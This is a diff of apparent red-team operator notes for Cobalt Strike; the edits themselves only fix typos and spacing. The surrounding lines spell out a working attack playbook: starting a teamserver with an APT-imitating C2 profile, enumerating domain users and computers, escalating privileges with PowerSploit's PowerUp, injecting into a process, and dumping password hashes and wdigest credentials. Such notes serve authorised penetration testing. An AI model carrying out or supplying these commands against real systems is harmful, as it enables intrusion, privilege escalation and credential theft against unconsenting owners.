@@ -13,14 +13,14 @@ apt-get install oracle-java8-installer
 cd /opt/cobaltstrike/
 ./update
 
-Start the team server
+Start the teamserver
      ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
      The first 2 parameters are required.
 
      ./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
      Copy the SHA256 hash and send to other members on your team.
 
-Login to team server
+Login to the teamserver
      Open a new Terminal
      ./cobaltstrike
      Host: IP of team server
@@ -107,7 +107,7 @@ Enumerate the target
      shell net localgroup Administrators
      shell arp -a
 
-Escalate privledges
+Escalate privileges
      powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
      powerpick Invoke-AllChecks
 
@@ -128,15 +128,14 @@ Dump passwords
      inject 5678 x64 smb
      Select the new user in the top pane > right click > Interact
 ------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------
 
 Needs admin privs
-     shell net view /domain                       Find what domain you are on.
+     shell net view /domain                          Find what domain you are on
      shell net localgroup Administrators /domain
-     shell net group "Domain Computers" /domain   List all computers joined to the domain.
-     wdigest                                      See if there are any interesting credentials.
-     hashdump                                     Dump the hashes.
+     shell net group "Domain Computers" /domain      List all computers joined to the domain
+     wdigest                                         See if there are any interesting credentials
+     hashdump                                        Dump the hashes
 
 Misc
-     shell nltest /dclist:<domain>                Locate the domain controller.
+     shell nltest /dclist:<domain>                   Locate the domain controller
 
